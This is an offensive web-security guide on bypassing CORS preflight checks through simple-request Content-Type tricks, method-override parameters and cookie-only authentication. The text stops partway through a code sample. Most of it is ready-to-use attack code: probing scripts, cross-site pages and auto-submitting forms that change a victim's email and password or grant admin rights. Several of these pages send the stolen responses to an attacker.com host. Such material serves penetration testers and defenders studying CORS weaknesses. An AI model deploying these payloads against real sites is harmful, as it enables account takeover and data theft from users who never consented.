---
title: Preflight Request Bypass
description: CORS preflight (OPTIONS) checks by crafting simple requests, abusing Content-Type parsing, method downgrading, header manipulation, and browser-specific quirks to achieve cross-origin data theft and state-changing actions.
navigation:
  icon: i-lucide-rotate-ccw
  title: Preflight Request Bypass
---

## Attack Theory

CORS preflight is a browser-enforced mechanism that sends an `OPTIONS` request before the actual cross-origin request when certain conditions are met. The preflight asks the server whether the actual request is permitted. Bypassing preflight means crafting requests that browsers classify as "simple" — avoiding the `OPTIONS` check entirely — while still reaching sensitive server-side functionality.

::callout{icon="i-lucide-flame" color="red"}
**Core Principle:** Browsers only send preflight `OPTIONS` requests for "non-simple" requests. If an attacker can restructure a malicious cross-origin request to meet "simple request" criteria, the browser fires it directly with cookies attached — no preflight, no server-side CORS validation on OPTIONS, and the request hits the endpoint immediately.
::

### Preflight Decision Flow

```text [Browser Preflight Decision Engine]
┌────────────────────────────────────────────────────────────────────┐
│                  Cross-Origin Request Initiated                    │
│                  (from attacker.com to target.com)                 │
└───────────────────────────┬────────────────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────────────────┐
│  CHECK 1: Is the HTTP method "simple"?                             │
│  Simple methods: GET, HEAD, POST                                   │
│  Non-simple: PUT, DELETE, PATCH, OPTIONS, CONNECT, TRACE           │
└───────────────┬───────────────────────────────────┬────────────────┘
                │ YES                               │ NO
                ▼                                   ▼
┌──────────────────────────┐           ┌──────────────────────────┐
│  CHECK 2: Are all        │           │  PREFLIGHT REQUIRED ⛔   │
│  headers "simple"?       │           │  Browser sends OPTIONS   │
│                          │           │  first to ask permission │
│  Simple headers:         │           └──────────────────────────┘
│  - Accept                │
│  - Accept-Language       │
│  - Content-Language      │
│  - Content-Type (*)      │
│  - Range (simple range)  │
│                          │
│  (*) Only if value is:   │
│  - application/x-www-    │
│    form-urlencoded       │
│  - multipart/form-data   │
│  - text/plain            │
└──────────┬───────────────┘
           │
      ┌────┴────┐
      │YES      │NO
      ▼         ▼
┌──────────┐  ┌──────────────────────────┐
│CHECK 3:  │  │  PREFLIGHT REQUIRED ⛔   │
│No custom │  │  Custom header detected  │
│headers?  │  │  (Authorization, X-*,    │
│No event  │  │   Content-Type: json...) │
│listeners │  └──────────────────────────┘
│on upload?│
└────┬─────┘
     │
┌────┴────┐
│YES      │NO
▼         ▼
┌───────────────────┐  ┌───────────────────────┐
│  SIMPLE REQUEST   │  │  PREFLIGHT REQUIRED ⛔ │
│  ✅ No OPTIONS    │  │  ReadableStream body   │
│  Request fires    │  │  or upload listener    │
│  directly with    │  └───────────────────────┘
│  cookies attached │
└───────────────────┘
```

```text [Preflight vs Simple Request Comparison]
═══════════════════════════════════════════════════════════════
  SIMPLE REQUEST (No Preflight)          PREFLIGHTED REQUEST
═══════════════════════════════════════════════════════════════

  Browser                Server           Browser           Server
    │                      │                │                  │
    │  POST /api/data      │                │  OPTIONS /api    │
    │  Content-Type:       │                │  Origin: evil    │
    │   text/plain         │                │  AC-Req-Method:  │
    │  Cookie: session=x   │                │   DELETE         │
    │  Origin: evil.com    │                │  AC-Req-Headers: │
    │─────────────────────▶│                │   Authorization  │
    │                      │                │─────────────────▶│
    │  200 OK              │                │                  │
    │  ACAO: evil.com      │                │  200 OK          │
    │  ACAC: true          │                │  ACAO: evil.com  │
    │  {sensitive data}    │                │  AC-Allow-Meth:  │
    │◀─────────────────────│                │   GET, POST      │
    │                      │                │  (no DELETE!)    │
    │  JS CAN READ ✅      │                │◀─────────────────│
    │                      │                │                  │
    │                      │                │  BLOCKED ❌       │
    │                      │                │  Browser stops   │
    │                      │                │  (no actual req) │

═══════════════════════════════════════════════════════════════
```

### What Triggers and Avoids Preflight

::field-group

::field{name="Simple Methods (No Preflight)" type="safe"}
`GET`, `HEAD`, `POST` — These three methods never trigger preflight on their own. The browser considers them "simple" because HTML forms can already send them natively.
::

::field{name="Non-Simple Methods (Trigger Preflight)" type="blocked"}
`PUT`, `DELETE`, `PATCH`, `OPTIONS`, `CONNECT`, `TRACE` — Any of these methods immediately triggers a preflight OPTIONS request regardless of headers or content type.
::

::field{name="Simple Content-Types (No Preflight)" type="safe"}
`application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain` — Only these three Content-Type values avoid preflight. Anything else (especially `application/json`) triggers it.
::

::field{name="Non-Simple Content-Types (Trigger Preflight)" type="blocked"}
`application/json`, `application/xml`, `text/xml`, `application/graphql`, `application/octet-stream`, and any custom Content-Type value trigger preflight.
::

::field{name="Simple Headers (No Preflight)" type="safe"}
`Accept`, `Accept-Language`, `Content-Language`, `Content-Type` (with simple value), `Range` (with simple range value) — Only these CORS-safelisted headers avoid preflight.
::

::field{name="Non-Simple Headers (Trigger Preflight)" type="blocked"}
`Authorization`, `X-Requested-With`, `X-CSRF-Token`, `X-Custom-*`, `Content-Type: application/json`, and any other header not in the safelist triggers preflight.
::

::field{name="ReadableStream Body" type="blocked"}
If the request body is a `ReadableStream`, preflight is always triggered regardless of method or headers.
::

::field{name="Upload Event Listeners" type="blocked"}
If `XMLHttpRequest.upload.addEventListener()` is used, preflight is triggered.
::

::

---

## Reconnaissance — Preflight Behavior Analysis

### Identifying Preflight Requirements

::tabs

:::tabs-item{icon="i-lucide-terminal" label="curl — OPTIONS Probe"}

```bash [Preflight Probing]
# Send OPTIONS preflight manually
curl -sI -X OPTIONS https://target.com/api/data \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" | grep -i "access-control"

# Check what methods are allowed
curl -sI -X OPTIONS https://target.com/api/data \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: DELETE" | grep -i "access-control-allow-methods"

# Check what headers are allowed
curl -sI -X OPTIONS https://target.com/api/data \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Authorization, X-Custom-Header, Content-Type" | grep -i "access-control-allow-headers"

# Check preflight cache duration
curl -sI -X OPTIONS https://target.com/api/data \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" | grep -i "access-control-max-age"

# Full preflight header dump
curl -v -X OPTIONS https://target.com/api/data \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type, Authorization" 2>&1 | grep -E "^< "
```

:::

:::tabs-item{icon="i-lucide-terminal" label="Content-Type Probing"}

```bash [Content-Type Acceptance Testing]
# Test which Content-Types the API accepts
TARGET="https://target.com/api/data"
COOKIE="session=YOUR_SESSION"
BODY='{"key":"value"}'

# application/json (triggers preflight)
curl -s -o /dev/null -w "%{http_code}" "$TARGET" \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: $COOKIE" -d "$BODY"

# text/plain (NO preflight)
curl -s -o /dev/null -w "%{http_code}" "$TARGET" \
  -X POST -H "Content-Type: text/plain" \
  -H "Cookie: $COOKIE" -d "$BODY"

# application/x-www-form-urlencoded (NO preflight)
curl -s -o /dev/null -w "%{http_code}" "$TARGET" \
  -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: $COOKIE" -d "key=value"

# multipart/form-data (NO preflight)
curl -s -o /dev/null -w "%{http_code}" "$TARGET" \
  -X POST -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
  -H "Cookie: $COOKIE" -d "$BODY"

# text/plain with JSON body (NO preflight, server may parse as JSON)
curl -s "$TARGET" \
  -X POST -H "Content-Type: text/plain" \
  -H "Cookie: $COOKIE" -d "$BODY"

# No Content-Type header at all
curl -s "$TARGET" \
  -X POST -H "Cookie: $COOKIE" -d "$BODY"

# application/x-www-form-urlencoded with JSON body
curl -s "$TARGET" \
  -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: $COOKIE" -d "$BODY"

# text/plain with charset
curl -s "$TARGET" \
  -X POST -H "Content-Type: text/plain; charset=utf-8" \
  -H "Cookie: $COOKIE" -d "$BODY"

# text/plain with arbitrary parameter
curl -s "$TARGET" \
  -X POST -H "Content-Type: text/plain; application/json" \
  -H "Cookie: $COOKIE" -d "$BODY"
```

:::

:::tabs-item{icon="i-lucide-terminal" label="Method Probing"}

```bash [HTTP Method Acceptance Testing]
TARGET="https://target.com/api/data"
COOKIE="session=YOUR_SESSION"
BODY='{"action":"delete_user","id":1}'

# Test which methods the endpoint accepts
for method in GET POST PUT PATCH DELETE HEAD OPTIONS; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET" \
    -X "$method" \
    -H "Content-Type: application/json" \
    -H "Cookie: $COOKIE" \
    -d "$BODY" 2>/dev/null)
  echo "$method → HTTP $CODE"
done

# Check if POST accepts operations meant for PUT/DELETE
# (method override patterns)
curl -s "$TARGET" -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: $COOKIE" \
  -d '{"_method":"DELETE","id":1}'

curl -s "$TARGET" -X POST \
  -H "Content-Type: application/json" \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Cookie: $COOKIE" \
  -d '{"id":1}'

curl -s "$TARGET?_method=DELETE" -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: $COOKIE" \
  -d '{"id":1}'
```

:::

:::tabs-item{icon="i-lucide-globe" label="Browser Console"}

```javascript [Browser Preflight Detection]
// Test 1: Simple request (no preflight expected)
fetch('https://target.com/api/data', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'text/plain' },
  body: '{"test":1}'
}).then(r => {
  console.log('[text/plain] Status:', r.status);
  console.log('[text/plain] ACAO:', r.headers.get('access-control-allow-origin'));
  return r.text();
}).then(t => console.log('[text/plain] Body:', t.substring(0, 200)));

// Test 2: Preflighted request (OPTIONS sent first)
fetch('https://target.com/api/data', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: '{"test":1}'
}).then(r => {
  console.log('[json] Status:', r.status);
  console.log('[json] ACAO:', r.headers.get('access-control-allow-origin'));
}).catch(e => console.log('[json] BLOCKED by preflight:', e));

// Test 3: Check if server parses text/plain body as JSON
fetch('https://target.com/api/data', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'text/plain' },
  body: JSON.stringify({ action: 'get_user_info' })
}).then(r => r.text()).then(t => console.log('Server response to text/plain JSON:', t));

// Monitor network tab for OPTIONS requests
// Open DevTools > Network > Filter by "method:OPTIONS"
```

:::

::

### Mapping Preflight-Protected vs Unprotected Endpoints

```bash [Systematic Endpoint Classification]
#!/bin/bash
TARGET_BASE="https://target.com"
COOKIE="session=YOUR_SESSION"

ENDPOINTS=(
  "/api/me" "/api/users" "/api/profile" "/api/settings"
  "/api/data" "/api/export" "/api/admin" "/api/keys"
  "/api/tokens" "/api/config" "/api/upload" "/api/search"
  "/api/graphql" "/api/v1/users" "/api/v2/data"
  "/graphql" "/rest/api/user" "/wp-json/wp/v2/users"
)

echo "Endpoint Preflight Classification"
echo "================================================================"
printf "%-30s | %-12s | %-12s | %-12s\n" "Endpoint" "text/plain" "form-urlenc" "json"
echo "================================================================"

for ep in "${ENDPOINTS[@]}"; do
  URL="${TARGET_BASE}${ep}"
  
  # Test text/plain (no preflight)
  TP=$(curl -s -o /dev/null -w "%{http_code}" "$URL" \
    -X POST -H "Content-Type: text/plain" \
    -H "Cookie: $COOKIE" -d '{"test":1}' 2>/dev/null)
  
  # Test form-urlencoded (no preflight)
  FU=$(curl -s -o /dev/null -w "%{http_code}" "$URL" \
    -X POST -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: $COOKIE" -d 'test=1' 2>/dev/null)
  
  # Test application/json (triggers preflight)
  JS=$(curl -s -o /dev/null -w "%{http_code}" "$URL" \
    -X POST -H "Content-Type: application/json" \
    -H "Cookie: $COOKIE" -d '{"test":1}' 2>/dev/null)
  
  printf "%-30s | %-12s | %-12s | %-12s\n" "$ep" "$TP" "$FU" "$JS"
done
```

---

## Content-Type Manipulation Bypass

### The Primary Bypass Vector

::warning
The most reliable preflight bypass technique is Content-Type manipulation. If the server processes JSON request bodies regardless of the Content-Type header value, an attacker can send `Content-Type: text/plain` with a JSON body — the browser treats this as a simple request (no preflight) while the server parses it as JSON.
::

```text [Content-Type Bypass Mechanism]
┌─────────────────────────────────────────────────────────────┐
│  Normal API Request (triggers preflight):                    │
│                                                             │
│  POST /api/settings HTTP/1.1                                │
│  Content-Type: application/json    ← TRIGGERS PREFLIGHT     │
│  Cookie: session=abc123                                     │
│  {"email":"attacker@evil.com"}                              │
│                                                             │
│  Browser: "application/json is not simple → send OPTIONS"   │
│  Server OPTIONS handler: "Origin not whitelisted → deny"    │
│  Result: BLOCKED ❌                                         │
├─────────────────────────────────────────────────────────────┤
│  Bypass Request (no preflight):                              │
│                                                             │
│  POST /api/settings HTTP/1.1                                │
│  Content-Type: text/plain          ← SIMPLE (no preflight)  │
│  Cookie: session=abc123            ← Cookies still sent!    │
│  {"email":"attacker@evil.com"}     ← Same JSON body!        │
│                                                             │
│  Browser: "text/plain is simple → send directly"            │
│  Server: "Body looks like JSON → parse it → process it"     │
│  Result: EMAIL CHANGED ✅ (if ACAO reflects origin)         │
└─────────────────────────────────────────────────────────────┘
```

### text/plain with JSON Body

::tabs

:::tabs-item{icon="i-lucide-code" label="fetch API"}

```html [text/plain JSON Bypass — fetch]
<!DOCTYPE html>
<html>
<body>
<script>
// No preflight — Content-Type: text/plain is "simple"
// But body is valid JSON — many servers parse it anyway
fetch('https://target.com/api/settings', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'text/plain'  // Simple — no preflight!
  },
  body: JSON.stringify({
    email: 'attacker@evil.com'
  })
}).then(r => r.text()).then(data => {
  console.log('Response:', data);
  // If server accepted it, the action was performed
  fetch('https://attacker.com/bypass-success', {
    method: 'POST',
    body: data
  });
});
</script>
</body>
</html>
```

:::

:::tabs-item{icon="i-lucide-code" label="XMLHttpRequest"}

```html [text/plain JSON Bypass — XHR]
<!DOCTYPE html>
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/api/settings', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'text/plain'); // Simple!
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4) {
    console.log('Status:', xhr.status);
    console.log('Response:', xhr.responseText);
    
    // Exfiltrate response if ACAO allows reading
    new Image().src = 'https://attacker.com/result?s=' + xhr.status + 
      '&d=' + encodeURIComponent(btoa(xhr.responseText));
  }
};
xhr.send(JSON.stringify({
  email: 'attacker@evil.com',
  password: 'newpassword123'
}));
</script>
</body>
</html>
```

:::

:::tabs-item{icon="i-lucide-code" label="HTML Form"}

```html [text/plain via HTML Form — No JavaScript]
<!DOCTYPE html>
<html>
<body>
<!-- HTML forms can send POST with text/plain encoding -->
<!-- enctype="text/plain" sends body as key=value with plain text -->
<!-- Trick: craft input name+value to produce valid JSON -->

<!-- Method 1: Simple text/plain form -->
<form action="https://target.com/api/settings" method="POST" enctype="text/plain">
  <!-- Body becomes: {"email":"attacker@evil.com","x":"= -->
  <input type="hidden" name='{"email":"attacker@evil.com","x":"' value='"}'>
  <input type="submit" value="Submit">
</form>

<!-- Method 2: Auto-submitting form -->
<form id="exploit" action="https://target.com/api/settings" method="POST" enctype="text/plain">
  <input type="hidden" name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.getElementById('exploit').submit();</script>

<!-- Note: text/plain encoding format is: name=value
     So input name={"email":"attacker@evil.com","x":" + value="}
     Produces body: {"email":"attacker@evil.com","x":"="}
     The "x":"=" part is junk but valid JSON that gets ignored -->
</body>
</html>
```

:::

::

### application/x-www-form-urlencoded with JSON Body

::code-group

```html [Form-Encoded with JSON Body]
<!DOCTYPE html>
<html>
<body>
<script>
// application/x-www-form-urlencoded is "simple" — no preflight
// Some servers auto-detect JSON body regardless of Content-Type
fetch('https://target.com/api/settings', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: '{"email":"attacker@evil.com"}'
  // Server with loose parsing may process this as JSON
}).then(r => r.text()).then(d => {
  fetch('https://attacker.com/result', { method: 'POST', body: d });
});
</script>
</body>
</html>
```

```html [Form-Encoded Key=Value to JSON Mapping]
<!DOCTYPE html>
<html>
<body>
<script>
// If server accepts form-encoded and maps to same logic:
fetch('https://target.com/api/settings', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'email=attacker@evil.com&password=newpass123'
  // Standard form encoding — server may process same as JSON
}).then(r => r.text()).then(d => {
  fetch('https://attacker.com/result', { method: 'POST', body: d });
});
</script>
</body>
</html>
```

```html [Auto-Submit Form — No JS Required]
<!DOCTYPE html>
<html>
<body>
<!-- Standard HTML form — sends application/x-www-form-urlencoded by default -->
<form id="exploit" action="https://target.com/api/settings" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="password" value="newpassword123">
</form>
<script>document.getElementById('exploit').submit();</script>
</body>
</html>
```

::

### multipart/form-data with JSON Body

```html [Multipart Form-Data Bypass]
<!DOCTYPE html>
<html>
<body>
<script>
// multipart/form-data is "simple" — no preflight
var formData = new FormData();
// Some servers accept JSON in a form field
formData.append('json', JSON.stringify({
  email: 'attacker@evil.com'
}));

fetch('https://target.com/api/settings', {
  method: 'POST',
  credentials: 'include',
  body: formData
  // Browser sets Content-Type: multipart/form-data automatically
  // No preflight triggered!
}).then(r => r.text()).then(d => {
  fetch('https://attacker.com/result', { method: 'POST', body: d });
});
</script>
</body>
</html>
```

```html [Multipart with Raw JSON in Boundary]
<!DOCTYPE html>
<html>
<body>
<script>
// Manual multipart construction with JSON body
// Some parsers extract JSON from the multipart body
var boundary = '----FormBoundary' + Math.random().toString(36);
var body = '--' + boundary + '\r\n' +
  'Content-Disposition: form-data; name="data"\r\n' +
  'Content-Type: application/json\r\n\r\n' +
  JSON.stringify({ email: 'attacker@evil.com' }) + '\r\n' +
  '--' + boundary + '--';

fetch('https://target.com/api/settings', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'multipart/form-data; boundary=' + boundary
  },
  body: body
}).then(r => r.text()).then(d => {
  fetch('https://attacker.com/result', { method: 'POST', body: d });
});
</script>
</body>
</html>
```

### Content-Type Charset / Parameter Abuse

::note
The CORS specification only checks the MIME type portion of Content-Type, not parameters like `charset`. Some variations add parameters that the browser still considers "simple" but may affect server-side parsing behavior.
::

::code-collapse

```html [Content-Type Parameter Variations]
<script>
const target = 'https://target.com/api/settings';
const payload = JSON.stringify({ email: 'attacker@evil.com' });
const opts = { method: 'POST', credentials: 'include' };

// Variation 1: text/plain with charset
fetch(target, { ...opts,
  headers: { 'Content-Type': 'text/plain; charset=utf-8' },
  body: payload
});

// Variation 2: text/plain with arbitrary parameter
fetch(target, { ...opts,
  headers: { 'Content-Type': 'text/plain; boundary=something' },
  body: payload
});

// Variation 3: text/plain with misleading parameter
// Browser sees text/plain → simple
// Server may see the parameter and adjust parsing
fetch(target, { ...opts,
  headers: { 'Content-Type': 'text/plain; type=application/json' },
  body: payload
});

// Variation 4: application/x-www-form-urlencoded with charset
fetch(target, { ...opts,
  headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8' },
  body: payload
});

// Variation 5: multipart/form-data with custom boundary
fetch(target, { ...opts,
  headers: { 'Content-Type': 'multipart/form-data; boundary=----exploit' },
  body: '------exploit\r\nContent-Disposition: form-data; name="data"\r\n\r\n' + payload + '\r\n------exploit--'
});

// Variation 6: text/plain with no charset but null byte (edge case)
fetch(target, { ...opts,
  headers: { 'Content-Type': 'text/plain\x00application/json' },
  body: payload
});

// Variation 7: Case variations (browser normalizes, server may not)
fetch(target, { ...opts,
  headers: { 'Content-Type': 'TEXT/PLAIN' },
  body: payload
});

fetch(target, { ...opts,
  headers: { 'Content-Type': 'Text/Plain' },
  body: payload
});
</script>
```

::

### Content-Type Bypass Testing Script

```bash [Automated Content-Type Bypass Test]
#!/bin/bash
TARGET="https://target.com/api/settings"
COOKIE="session=YOUR_SESSION"
JSON_BODY='{"email":"test@test.com"}'

echo "[*] Content-Type Bypass Testing"
echo "================================================================"

declare -A CONTENT_TYPES=(
  # Simple Content-Types (no preflight)
  ["text/plain"]="SIMPLE"
  ["text/plain; charset=utf-8"]="SIMPLE"
  ["text/plain; charset=UTF-8"]="SIMPLE"
  ["text/plain; charset=ISO-8859-1"]="SIMPLE"
  ["text/plain; boundary=something"]="SIMPLE"
  ["application/x-www-form-urlencoded"]="SIMPLE"
  ["application/x-www-form-urlencoded; charset=utf-8"]="SIMPLE"
  ["multipart/form-data"]="SIMPLE"
  ["multipart/form-data; boundary=----exploit"]="SIMPLE"
  ["TEXT/PLAIN"]="SIMPLE"
  ["Text/Plain"]="SIMPLE"
  
  # Non-simple Content-Types (preflight triggered)
  ["application/json"]="PREFLIGHT"
  ["application/xml"]="PREFLIGHT"
  ["text/xml"]="PREFLIGHT"
  ["application/graphql"]="PREFLIGHT"
)

for ct in "${!CONTENT_TYPES[@]}"; do
  type="${CONTENT_TYPES[$ct]}"
  
  # Send request with JSON body
  RESP=$(curl -s -o /tmp/ct_resp -w "%{http_code}" "$TARGET" \
    -X POST \
    -H "Content-Type: $ct" \
    -H "Cookie: $COOKIE" \
    -d "$JSON_BODY" 2>/dev/null)
  
  BODY_PREVIEW=$(cat /tmp/ct_resp | head -c 100 | tr -d '\n')
  
  # Check if server processed the JSON body
  if [ "$RESP" = "200" ] || [ "$RESP" = "201" ] || [ "$RESP" = "204" ]; then
    if [ "$type" = "SIMPLE" ]; then
      echo "[+] BYPASS: $ct → HTTP $RESP (No preflight, server accepted!)"
      echo "    Response: $BODY_PREVIEW"
    else
      echo "[~] Normal: $ct → HTTP $RESP (Preflight required)"
    fi
  else
    echo "[-] Reject: $ct → HTTP $RESP"
  fi
done
```

---

## HTTP Method Manipulation

### Method Override Techniques

::warning
Many web frameworks support method override headers and parameters, allowing a POST request to be treated as PUT, DELETE, or PATCH on the server side. Since POST is a "simple" method (no preflight), this effectively bypasses preflight for non-simple methods.
::

```text [Method Override Bypass Mechanism]
┌───────────────────────────────────────────────────────────────┐
│  Goal: Send DELETE /api/users/1 cross-origin                  │
│                                                               │
│  Direct DELETE:                                               │
│    DELETE /api/users/1                                        │
│    → Browser: "DELETE is not simple → send OPTIONS preflight" │
│    → Preflight fails → BLOCKED ❌                             │
│                                                               │
│  Method Override Bypass:                                      │
│    POST /api/users/1                                          │
│    X-HTTP-Method-Override: DELETE                             │
│    → Wait... X-HTTP-Method-Override triggers preflight too!  │
│                                                               │
│  Better Method Override Bypass:                               │
│    POST /api/users/1?_method=DELETE                           │
│    Content-Type: application/x-www-form-urlencoded            │
│    → No custom headers → No non-simple content type           │
│    → SIMPLE REQUEST → No preflight ✅                         │
│    → Server reads _method=DELETE → processes as DELETE        │
└───────────────────────────────────────────────────────────────┘
```

### Method Override via Query Parameter

::code-group

```html [_method Query Parameter]
<!DOCTYPE html>
<html>
<body>
<script>
// Many frameworks support ?_method=DELETE on POST requests
// POST is simple → no preflight

// DELETE via _method parameter
fetch('https://target.com/api/users/1?_method=DELETE', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: ''
}).then(r => r.text()).then(d => console.log('DELETE result:', d));

// PUT via _method parameter
fetch('https://target.com/api/users/1?_method=PUT', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'text/plain' },
  body: JSON.stringify({ role: 'admin' })
}).then(r => r.text()).then(d => console.log('PUT result:', d));

// PATCH via _method parameter
fetch('https://target.com/api/users/1?_method=PATCH', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'text/plain' },
  body: JSON.stringify({ email: 'attacker@evil.com' })
}).then(r => r.text()).then(d => console.log('PATCH result:', d));
</script>
</body>
</html>
```

```html [HTML Form with _method]
<!-- Laravel/Rails style _method in form body -->
<form id="exploit" action="https://target.com/api/users/1" method="POST">
  <input type="hidden" name="_method" value="DELETE">
</form>
<script>document.getElementById('exploit').submit();</script>

<!-- PUT via form -->
<form id="exploit2" action="https://target.com/api/users/1" method="POST">
  <input type="hidden" name="_method" value="PUT">
  <input type="hidden" name="role" value="admin">
</form>
<script>document.getElementById('exploit2').submit();</script>
```

::

### Method Override via Request Body

```html [Method Override in Body]
<!DOCTYPE html>
<html>
<body>
<script>
// Some frameworks read _method from POST body
// application/x-www-form-urlencoded with _method field

// DELETE
fetch('https://target.com/api/users/1', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: '_method=DELETE'
});

// PUT with data
fetch('https://target.com/api/users/1', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: '_method=PUT&role=admin&email=attacker@evil.com'
});

// JSON body with _method (text/plain to avoid preflight)
fetch('https://target.com/api/users/1', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'text/plain' },
  body: JSON.stringify({
    _method: 'DELETE'
  })
});
</script>
</body>
</html>
```

### Method Override Header Smuggling

::note
Custom headers like `X-HTTP-Method-Override` normally trigger preflight. However, if the CORS configuration allows these headers, or if you can smuggle them through other means, the override works cross-origin.
::

```bash [Test Method Override Support]
# Test which override mechanisms the server supports
TARGET="https://target.com/api/users/1"
COOKIE="session=YOUR_SESSION"

echo "[*] Testing method override mechanisms"

# Query parameter variations
for param in _method method _METHOD httpMethod http_method; do
  for method in DELETE PUT PATCH; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" \
      "${TARGET}?${param}=${method}" \
      -X POST -H "Cookie: $COOKIE" 2>/dev/null)
    [ "$CODE" != "404" ] && [ "$CODE" != "405" ] && \
      echo "[+] Query: ?${param}=${method} → HTTP $CODE"
  done
done

# Body parameter variations (form-encoded)
for param in _method method _METHOD; do
  for method in DELETE PUT PATCH; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET" \
      -X POST -H "Content-Type: application/x-www-form-urlencoded" \
      -H "Cookie: $COOKIE" -d "${param}=${method}" 2>/dev/null)
    [ "$CODE" != "404" ] && [ "$CODE" != "405" ] && \
      echo "[+] Body: ${param}=${method} → HTTP $CODE"
  done
done

# Header-based overrides (these DO trigger preflight but test server support)
for header in X-HTTP-Method-Override X-HTTP-Method X-Method-Override; do
  for method in DELETE PUT PATCH; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET" \
      -X POST -H "${header}: ${method}" \
      -H "Content-Type: application/json" \
      -H "Cookie: $COOKIE" -d '{}' 2>/dev/null)
    [ "$CODE" != "404" ] && [ "$CODE" != "405" ] && \
      echo "[~] Header (needs CORS allow): ${header}: ${method} → HTTP $CODE"
  done
done
```

### Framework-Specific Method Override Patterns

::collapsible

| Framework | Override Mechanism | Preflight Bypass? |
| --- | --- | --- |
| Laravel (PHP) | `_method` in POST body or query | ✅ Via form-encoded body |
| Rails (Ruby) | `_method` in POST body | ✅ Via form-encoded body |
| Spring (Java) | `HiddenHttpMethodFilter` — `_method` in body | ✅ Via form-encoded body |
| Django (Python) | `django.middleware.http.MethodOverrideMiddleware` — not default | ✅ If middleware enabled |
| Express (Node) | `method-override` middleware — `_method` query/body/header | ✅ Via query or body |
| ASP.NET | `X-HTTP-Method-Override` header | ❌ Header triggers preflight |
| Flask (Python) | `MethodOverride` middleware (if added) | ✅ Via query parameter |
| Symfony (PHP) | `_method` in POST body (default enabled) | ✅ Via form-encoded body |
| Play (Scala) | Not built-in | N/A |
| Gin (Go) | Not built-in | N/A |
| FastAPI (Python) | Not built-in | N/A |

::

---

## Header Manipulation

### Avoiding Custom Headers

```text [Header Classification for Preflight]
┌────────────────────────────────────────────────────────────────┐
│              CORS-Safelisted Request Headers                   │
│              (Do NOT trigger preflight)                        │
│                                                                │
│  Accept           → Any value                                  │
│  Accept-Language   → Language tags only                        │
│  Content-Language  → Language tags only                        │
│  Content-Type      → Only 3 simple values (see above)         │
│  Range             → Simple range value (bytes=N-M)           │
│                                                                │
│  Restrictions on safelisted headers:                           │
│  - Value must not contain bytes outside 0x00-0x7F (for some)  │
│  - Accept: no CORS-unsafe byte                                │
│  - Content-Type: must be one of the 3 simple types            │
│  - Total size of all safelisted headers ≤ ~128 bytes (Chrome) │
├────────────────────────────────────────────────────────────────┤
│              Headers That TRIGGER Preflight                    │
│                                                                │
│  Authorization     → Bearer tokens, Basic auth                │
│  X-Requested-With  → AJAX indicator                           │
│  X-CSRF-Token      → CSRF protection                          │
│  X-Custom-*        → Any custom header                        │
│  Content-Type      → application/json, application/xml, etc.  │
│  Cache-Control     → Not safelisted                           │
│  Pragma            → Not safelisted                           │
│  If-Modified-Since → Not safelisted (for cross-origin)        │
│  Any non-safelisted header                                    │
└────────────────────────────────────────────────────────────────┘
```

### Removing Authorization Headers

::code-group

```html [Cookie-Only Authentication (No Auth Header)]
<!DOCTYPE html>
<html>
<body>
<script>
// If API uses cookies AND accepts requests without Authorization header
// Removing the Authorization header avoids preflight

// Many APIs accept cookie-based auth even if they also support Bearer tokens
fetch('https://target.com/api/me', {
  method: 'GET',
  credentials: 'include'
  // No Authorization header → no preflight trigger from headers
  // Cookies sent automatically with credentials: 'include'
}).then(r => r.json()).then(d => {
  fetch('https://attacker.com/data', {
    method: 'POST',
    body: JSON.stringify(d)
  });
});
</script>
</body>
</html>
```

```html [Session Cookie Fallback Test]
<!-- Test if API falls back to session cookie when no Authorization header is sent -->
<script>
async function testAuthFallback() {
  // Test 1: With only cookies (no Authorization header)
  try {
    const resp = await fetch('https://target.com/api/me', {
      credentials: 'include'
    });
    const data = await resp.json();
    console.log('[+] Cookie-only auth works:', data);
    
